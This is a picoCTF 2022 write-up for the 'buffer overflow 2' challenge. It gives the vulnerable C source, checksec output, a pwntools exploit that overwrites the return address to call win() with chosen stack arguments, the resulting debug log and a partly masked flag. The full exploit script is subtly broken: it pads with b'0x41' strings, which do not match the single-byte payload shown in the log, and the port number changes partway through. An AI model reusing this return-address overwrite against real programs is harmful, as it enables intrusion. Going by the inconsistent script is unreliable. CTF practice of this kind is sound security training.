# buffer overflow 2

Tags: picoCTF 2022, Binary Exploitation, gets, argments_on_the_stack

| Author | Point    |
| ------ | -------- |
| SANJAY C / PALASH OSWAL | 300 points |

## Description

Control the return address and arguments  
This time you'll need to control the arguments to the function you return to! Can you get the flag from this program?  
You can view source here. And connect with it using nc saturn.picoctf.net 58012

## Hints

1. Try using GDB to print out the stack once you write to it.

## Solve

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

The binary security mechanisms are as follows:

```bash
$ checksec.sh --file vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   vuln
```

It is possible to overwrite the return address in function vuln() and move it to function win().

![](<./images/CleanShot 2024-04-18 at 20.27.47.png>)

However, unless arg1 == 0xCAFEF00D and arg2 == 0xF00DF00D are satisfied, the buf containing the flag will not be printed.

```c
  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
```

![alt text](<./images/CleanShot 2024-04-18 at 20.33.28.png>)

So, the following is the payload:

```python
payload = b''
payload += b'A' * 112 # Junk
payload += p32(0x08049296) # Return address, Jump to win().
payload += b'B' * 4 # Dummy return address to main().
payload += p32(0xcafef00d) # 1st argument
payload += p32(0xf00df00d) # 2nd argument
```

The full exploit code is as follows.

```python
from pwn import *

context.log_level = 'debug'

host = 'saturn.picoctf.net'
port = 50202


p = remote(host, port)

p.recvline()

payload = b''
payload += b'0x41' * 112 # Junk
payload += p32(0x08049296) # Return address, Jump to win().
payload += b'0x42' * 4 # Dummy return address to main().
payload += p32(0xcafef00d) # 1st argument
payload += p32(0xf00df00d) # 2nd argument

p.sendline(payload)

'''
When send payload, the stack is as follows.
------------------------------------------------------
|           Junk 112 bytes, b'0x41' * 112            | <- Offset
------------------------------------------------------
|    Return address to win() 4 bytes, 0x08049296     | <- EIP
------------------------------------------------------
| Dummy return address to main() 4 bytes, b'0x42' * 4|
------------------------------------------------------
|               Arg1 4 bytes, 0xcafef00d             |
------------------------------------------------------
|               Arg2 4 bytes, 0xf00df00d             |
------------------------------------------------------
'''

p.recvall()
```

Run the exploit.

```bash
$ python3 exploit.py            
[+] Opening connection to saturn.picoctf.net on port 50202: Done
[DEBUG] Received 0x1b bytes:
    b'Please enter your string: \n'
[DEBUG] Sent 0x81 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000070  96 92 04 08  42 42 42 42  0d f0 fe ca  0d f0 0d f0  │····│BBBB│····│····│
    00000080  0a                                                  │·│
    00000081
[+] Receiving all data: Done (163B)
[DEBUG] Received 0x81 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000070  96 92 04 08  42 42 42 42  0d f0 fe ca  0d f0 0d f0  │····│BBBB│····│····│
    00000080  0a                                                  │·│
    00000081
[DEBUG] Received 0x22 bytes:
    b'picoCTF{argum3nt5_4_d4yZ_********}'
[*] Closed connection to saturn.picoctf.net port 50202
```

## Flag

```
picoCTF{argum3nt5_4_d4yZ_********}
```